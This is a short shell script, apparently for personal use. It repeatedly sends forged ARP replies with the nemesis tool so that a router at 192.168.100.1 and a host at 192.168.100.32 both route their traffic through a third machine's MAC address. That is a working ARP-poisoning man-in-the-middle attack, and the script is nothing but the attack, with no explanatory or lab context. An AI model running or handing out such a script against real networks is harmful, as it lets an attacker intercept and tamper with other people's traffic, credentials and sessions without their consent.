#!/bin/sh

while true
do
sudo nemesis arp -v -r -d wlo1 -S 192.168.100.1 -D 192.168.100.32 -h f8:54:f6:81:05:31 -m 76:c8:87:0b:bf:bc -H f8:54:f6:81:05:31 -M 76:c8:87:0b:bf:bc 
sudo nemesis arp -v -r -d wlo1 -S 192.168.100.32 -D 192.168.100.1 -h f8:54:f6:81:05:31 -m 28:fb:ae:3a:b9:d2  -H f8:54:f6:81:05:31 -M 28:fb:ae:3a:b9:d2  
echo "Redirecting..."
sleep 10
done
